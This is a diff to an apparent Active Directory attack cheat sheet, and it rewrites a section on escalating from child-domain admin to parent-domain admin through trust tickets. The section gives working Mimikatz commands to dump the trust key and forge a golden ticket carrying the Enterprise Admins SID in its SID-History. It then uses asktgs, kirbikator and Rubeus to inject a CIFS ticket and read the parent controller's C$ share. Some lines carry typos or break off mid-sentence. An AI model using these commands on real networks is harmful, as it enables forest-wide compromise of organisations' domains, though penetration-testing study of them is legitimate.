@@ -1221,34 +1221,56 @@ sc \\targethosotname start dns
 
 ### Child to Parent using Trust Tickets
 ```powershell
-# In a trust  between child and parent, it's possible to move from domain admin in the child domain to Domain admin to parent.
+# In a trust  between child and parent, it's possible to move from DA in the child domain to DA in parent domain.
 # The trust was initially done by exchanging a trust key between parent and child.
 
-# First step is to extract the trust key from the child (which is compromised)
-Invoke-Mimikatz -Command '"lsadump::trust /patch"'      
-# The key to be extracted
+# When a user in the child domain requires a resource in parent domain:
+# - The user authenticates to the child Domain controller and gets the TGT
+# - The user request a TGS for the resource presenting the TGT
+# - The child KDC replies with an inter-realm TGT encrypted with the trust key  (if the resource were in the same domain it would a TGS encrypted by the SPN hash (Kerberoasting))
+# - The user ask a TGS to the KDC in the parent domain sending its inter-realm TGT, which replies with a TGS for the resource in the parent domain that the user can use.
+# The whole security in this process is in the trust key which is used to sign the inter-realm TGT
 
-```
-**2. Create the inter-realm TGT:**
-```powershell
-# Create the inter-realm TGT
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:<hash> /service:krbtgt /target:<domain> /ticket:C:\<directory>\trust_tkt.kirbi"'
-```
-**3. Get a TGS for a service in the target domain by using the
-forged trust ticket.:**
-```powershell
-# Get a TGS for a service (CIFS below)
-.\asktgs.exe C:\<directory>\trust_tkt.kirbi CIFS/mcorp-dc.corporate.local
-```
-**4. Use the TGS to access the targeted service and check:**
-```powershell
-# Use the TGS
-.\kirbikator.exe lsa .\CIFS.mcorp-dc.corporate.local.kirbi
-# Check
+# Foreword on SID-History:
+# Microsoft introduced aa feature named SIDHIstory to help migration of AD objects from a domain to another.
+# Basically it's an additional information in the AD that holds the past SIDs of an object in previous domains.
+# After a migration of an object from a domain A to domain B, the object in domain B also contains the SID previously used in the domain A, so the object can identify itself to domain A
+
+# Attacking scenario (Domain admin in the child domain is required)
+# The idea is to leverage SID-History of the child domain user.
+# 1. Get the trust key with mimikatz in the child domain
+# 2. Forge a golden ticket that includes in the SID-HIstory the SID of the "Enterprise Admin" group (RID is 519) of the parent domain (<SID of parent domain>-519)
+# 3. Use the golden ticket for PTT and access the parent domain
+
+# First step is to extract the trust key from the child (which is compromised) using on of the three methods below. Which key
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadumd::dcsync /user:dcorp\mcorp$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+# There are multiple keys (different timestamp)
+# Choose the most recent ([ In ]) 
+
+
+# The key to be extracted must be
+# Generate the Golden ticket using
+# /sid: SID of the child domain
+# /sids: SID of the parent domain "Enterprise admins group" (forged Sid-History)
+# /rc4:  trust key in rc4 format
+# /target: parent domain name
+# /ticket: the arget file to store the golden ticket
+BetterSafetyKatz "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:<hash> /service:krbtgt /target:moneycorp.local /ticket:C:\<directory>\trust_tkt.kirbi" "exit"
+
+# Get a TGS for CIFS service using the golden ticket (asktgs) and inject it(kirbikator)
+asktgs.exe C:\<directory>\trust_tkt.kirbi CIFS/mcorp-dc.corporate.local
+kirbikator.exe lsa .\CIFS.mcorp-dc.corporate.local.kirbi
+
+# Alternatively use Rubes in one 
+Rubeus.exe asktgs /ticket:C:\<directory>\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+
+# profit with
 ls \\mcorp dc.corporate.local\c$
 
+# Obviously this can ba done also for HTTP, HOST, RPCSS services to access various services.
 # In a multilevel schema it's possible to do the previous steps multiple times to compromise one parent at a time until reaching the forest root
-
 ```
 
 ### Child to Parent using Krbtgt Hash
